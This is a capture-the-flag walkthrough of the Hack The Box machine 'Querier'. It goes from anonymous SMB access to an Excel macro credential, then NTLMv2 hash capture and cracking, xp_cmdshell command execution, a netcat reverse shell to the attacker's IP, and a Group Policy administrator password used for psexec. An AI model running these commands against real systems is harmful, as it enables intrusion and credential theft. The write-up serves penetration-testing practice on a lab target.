# Querier
https://app.hackthebox.com/machines/Querier


Target IP
10.10.10.125

## Enumeration
---

First lets start with [AutoRecon](https://github.com/Tib3rius/AutoRecon).
```
sudo $(which autorecon) 10.10.10.125
```

### Nmap

Nmap shows us the following ports open
```
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-21T00:30:33
| Not valid after:  2052-10-21T00:30:33
| MD5:   d7f4383958c96375ecf059c8b0202a8e
| SHA-1: 2a7cd3fb02f585dd0b9cb65108a24d6fdca660c6
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQEHsfsQqjh5FEsi67hb8liTANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjIxMDIxMDAzMDMzWhgPMjA1MjEwMjEwMDMwMzNaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALa52Muz
| hYjlGao1ztHX4mzqYJemZkGW9xwFy/DdPg2Ga6ccnUJkBUYiYoGukCh5BXr24yMt
| 8FdkFP+zSnGm1yNnwOQAH9ThN3J0VUO1UpgMRg1gzPs9DjemnCJg/Gv3wAk03F4t
| Vo9uonF/N/Xdw2G2v4rU2s5MDzh5bpz+6Q1SX1vpeTSigrpDCPLcr+stUrk2DPe3
| KUCtldWBvjiOz4g8XyojysifVtlL8h3HfT6b365HvDg4a4ThmuECemPWuMYboTil
| k7DUaTk/EkiqUFlzMqm+CEummP6yaHD6OohWYj6EwY91vOYTyGtF3FDdsySuIWw4
| luRWMADIRUMLKbUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEANoSgqalMC1a7TC7L
| JnOVroIg758GezfHNR+tdFglw2WkpJvX/o+5OAnCSdg5SeBGNEIDCzUSCdqrEm6T
| 6BaodnCWDKQd/qyYCn+GtOXQuEx2a2Chez9cPDSH/UdDcjSOKFjPybotKmMbc7P3
| DekxSOjUT4/E44q8uVINLXAfQLUbsAhWPyWnTNsOLFW17ARZHMTDOZUuBvFj4jHl
| V3sxTA8+Be8i1OVtBVH0YqnUplOiqym3Zk0+RHfPCRUlC5D5C+iyZKvdm1hIq1/z
| RBboCONi2BYgW879wOBycvpVoOROeKI1QIhEShCC6jXpnkDhfIJArvarZO9TNAxF
| PORA5Q==
|_-----END CERTIFICATE-----
|_ssl-date: 2022-10-21T01:01:43+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=10/20%OT=135%CT=1%CU=43144%PV=Y%DS=2%DC=T%G=Y%TM=6351E
OS:F78%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%T
OS:S=U)OPS(O1=M539NW8NNS%O2=M539NW8NNS%O3=M539NW8%O4=M539NW8NNS%O5=M539NW8N
OS:NS%O6=M539NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=
OS:Y%DF=Y%T=80%W=FFFF%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%R
OS:D=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0
OS:%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%C
OS:D=Z)
```

### SMB - port 445

Do we have access to SMB with no user?
```
$ smbmap -H 10.10.10.125 -u anonymous
[+] Guest session       IP: 10.10.10.125:445    Name: 10.10.10.125                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Reports                                                 READ ONLY
```


```
$ smbclient //10.10.10.125/Reports -N                
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 28 15:23:48 2019
  ..                                  D        0  Mon Jan 28 15:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 14:21:34 2019

                5158399 blocks of size 4096. 844390 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (6.7 KiloBytes/sec) (average 6.7 KiloBytes/sec)
```


```
$ olevba Currency\ Volume\ Report.xlsm 
olevba 0.60.1 on Python 3.10.5 - http://decalage.info/python/oletools
===============================================================================
FILE: Currency Volume Report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

From `ConnectionString` we see a credential
```
...
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
...
```

| Username | Password |
| --- | --- |
| reporting | PcwTWTHRwryjc$c6 |


Fail with no `-windows-auth`
```
$ /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password: PcwTWTHRwryjc$c6
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
```

But works with `-windows-auth` 
```
$ /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting@10.10.10.125 -windows-auth                 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password: PcwTWTHRwryjc$c6
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```


```
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

Lets try to use `enable_xp_cmdshell`.

```
SQL> enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```
No good.


Lets try to list a SMB Share from our Kali with `Respoder` running. This may get a hash.
```
$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.4]
    Responder IPv6             [dead:beef:2::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-JSVJ3M5P3HG]
    Responder Domain Name      [REW4.LOCAL]
    Responder DCE-RPC Port     [49803]

[+] Listening for events...
```

Now that `Responder` is running lets try to list a share from it.
```
SQL>  xp_dirtree "\\10.10.14.4\share"
subdirectory                                                                                                                                                                                                                                                            depth   

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   ----------- 
```

Back on `Responder` we see the following
```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:14714487b378818e:AA8BF17C527AF491C4B05909AF7CF651:0101000000000000808B5777B1E4D801034D40135B7E8E250000000002000800520045005700340001001E00570049004E002D004A00530056004A0033004D003500500033004800470004003400570049004E002D004A00530056004A0033004D00350050003300480047002E0052004500570034002E004C004F00430041004C000300140052004500570034002E004C004F00430041004C000500140052004500570034002E004C004F00430041004C0007000800808B5777B1E4D80106000400020000000800300030000000000000000000000000300000B0725A47651A2F832757289321F14BB025C06F15EA785DE1E6586E3EA63C312E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003400000000000000000000000000
```

`Responder` logs should have a file with captured hash.
```
$ ls -lha /usr/share/responder/logs 
total 44K
drwxr-xr-x 2 root root 4.0K Oct 20 18:28 .
drwxr-xr-x 9 root root 4.0K Oct 20 18:28 ..
-rw-r--r-- 1 root root    0 Aug 29 17:50 Analyzer-Session.log
-rw-r--r-- 1 root root  27K Oct 20 18:26 Config-Responder.log
-rw-r--r-- 1 root root    0 Oct 20 18:26 Poisoners-Session.log
-rw-r--r-- 1 root root 1.1K Oct 20 18:28 Responder-Session.log
-rw-r--r-- 1 root root 1.4K Oct 20 18:28 SMB-NTLMv2-SSP-10.10.10.125.txt
```

```
$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.125.txt          
mssql-svc::QUERIER:14714487b378818e:AA8BF17C527AF491C4B05909AF7CF651:0101000000000000808B5777B1E4D801034D40135B7E8E250000000002000800520045005700340001001E00570049004E002D004A00530056004A0033004D003500500033004800470004003400570049004E002D004A00530056004A0033004D00350050003300480047002E0052004500570034002E004C004F00430041004C000300140052004500570034002E004C004F00430041004C000500140052004500570034002E004C004F00430041004C0007000800808B5777B1E4D80106000400020000000800300030000000000000000000000000300000B0725A47651A2F832757289321F14BB025C06F15EA785DE1E6586E3EA63C312E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003400000000000000000000000000
```



Now, lets run `john` to try to crack the hash
```
$ john --wordlist=/usr/share/wordlists/rockyou.txt /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.10.125.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)     
1g 0:00:00:04 DONE (2022-10-20 18:31) 0.2012g/s 1803Kp/s 1803Kc/s 1803KC/s correforenz..coreyny11
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```


Perfect, we have one more credential

| Username | Password |
| --- | --- |
| reporting | PcwTWTHRwryjc$c6 |
| mssql-svc | corporate568 |


If we try to list shares of the target with this new user we don't get any thing different from before.
```
$ smbmap -H 10.10.10.125 -u mssql-svc -p corporate568 -d QUERIER
[+] IP: 10.10.10.125:445        Name: 10.10.10.125                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Reports                                                 READ ONLY
```

We can see the same with `crackmapexec`
```
$ crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d QUERIER.HTB.LOCAL --shares 
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER.HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] QUERIER.HTB.LOCAL\mssql-svc:corporate568 
SMB         10.10.10.125    445    QUERIER          [+] Enumerated shares
SMB         10.10.10.125    445    QUERIER          Share           Permissions     Remark
SMB         10.10.10.125    445    QUERIER          -----           -----------     ------
SMB         10.10.10.125    445    QUERIER          ADMIN$                          Remote Admin
SMB         10.10.10.125    445    QUERIER          C$                              Default share
SMB         10.10.10.125    445    QUERIER          IPC$            READ            Remote IPC
SMB         10.10.10.125    445    QUERIER          Reports         READ
```


Lets connect again on the SQL Server with this new credential
```
$ /usr/share/doc/python3-impacket/examples/mssqlclient.py mssql-svc@10.10.10.125 -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password: corporate568
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

Now if we try again `enable_xp_cmdshell` it works.
```
SQL> enable_xp_cmdshell
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Lets try to run a command now
```
SQL> xp_cmdshell whoami
output                                                                             
--------------------------------------------------------------------------------   
querier\mssql-svc                                                                  

NULL
```
Cool! It works.

How about the user flag?!
```
SQL> xp_cmdshell "type C:\Users\mssql-svc\Desktop\user.txt"
output                                                                             
--------------------------------------------------------------------------------   
5f1a************************deeb
```

We can continue investigating from here, but better do it from a better shell. Lets transfer `nc.exe` to the target and use it to open a reverse shell.

```
$ cd /usr/share/windows-resources/binaries

$ ls -lha                                                                                    
total 5.5M
drwxr-xr-x 7 root root 4.0K Oct 21 01:40 .
drwxr-xr-x 9 root root 4.0K Aug 28 00:42 ..
drwxr-xr-x 2 root root 4.0K Aug 28 00:42 enumplus
-rwxr-xr-x 1 root root  52K Jul 17  2019 exe2bat.exe
drwxr-xr-x 2 root root 4.0K Aug 28 00:42 fgdump
drwxr-xr-x 2 root root 4.0K Aug 28 00:42 fport
-rwxr-xr-x 1 root root  23K Jul 17  2019 klogger.exe
drwxr-xr-x 2 root root 4.0K Aug 28 00:42 mbenum
drwxr-xr-x 4 root root 4.0K Aug 28 00:42 nbtenum
-rwxr-xr-x 1 root root  58K Jul 17  2019 nc.exe
-rwxr-xr-x 1 root root 304K Jul 17  2019 plink.exe
-rwxr-xr-x 1 root root 688K Jul 17  2019 radmin.exe
-rwxr-xr-x 1 root root 356K Jul 17  2019 vncviewer.exe
-rwxr-xr-x 1 root root 302K Jul 17  2019 wget.exe
-rwxr-xr-x 1 root root  65K Jul 17  2019 whoami.exe
-rw-r--r-- 1 root root 1.9M Oct 15 21:52 winPEASany.exe
-rw-r--r-- 1 root root 1.8M Oct 15 21:52 winPEASany_ofs.exe

$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```


```
SQL> xp_cmdshell "powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.4/nc.exe -OutFile C:\Users\mssql-svc\nc.exe"
output                                                                             
--------------------------------------------------------------------------------   
NULL
```

```
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.125 - - [21/Oct/2022 01:07:00] "GET /nc.exe HTTP/1.1" 200 -
```


```
$ nc -nlvp 4444  
listening on [any] 4444 ...
```


```
SQL> xp_cmdshell "C:\Users\mssql-svc\nc.exe -e cmd.exe 10.10.14.4 4444"
```

```
$ nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.125] 49682
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
```

[WinPEAS](https://github.com/carlospolop/PEASS-ng/releases) is amazing tool to help on privilege escalation. Lets also transfer it to the target.

```
PS C:\Windows\system32> Invoke-WebRequest -Uri 'http://10.10.14.4/winPEASany.exe' -OutFile C:\Users\mssql-svc\winPEASany.exe
Invoke-WebRequest -Uri 'http://10.10.14.4/winPEASany.exe' -OutFile C:\Users\mssql-svc\winPEASany.exe
```

... and run it.
```
PS C:\Windows\system32> C:\Users\mssql-svc\winPEASany.exe
```

Inspecting the results, we see the following
```
...
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    Found C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
    Found C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
    UserName: Administrator
    NewName: [BLANK]
    cPassword: MyUnclesAreMarioAndLuigi!!1!
    Changed: 2019-01-28 23:12:48
...
```
We have administrator password.

| Username | Password |
| --- | --- |
| reporting | PcwTWTHRwryjc$c6 |
| mssql-svc | corporate568 |
| administrator | MyUnclesAreMarioAndLuigi!!1! |


We can now get a shell on the target as *Administrator* using `psexec.py`.
```
$ /usr/share/doc/python3-impacket/examples/psexec.py Administrator@10.10.10.125
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password: MyUnclesAreMarioAndLuigi!!1!
[*] Requesting shares on 10.10.10.125.....
[*] Found writable share ADMIN$
[*] Uploading file UVtEqqpa.exe
[*] Opening SVCManager on 10.10.10.125.....
[*] Creating service bwqS on 10.10.10.125.....
[*] Starting service bwqS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Or using `evil-winrm`
```
$ evil-winrm -i 10.10.10.125 -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'   

Evil-WinRM shell v3.4

...

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
querier\administrator
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat C:\Users\Administrator\Desktop\root.txt
e9fe************************62c1
```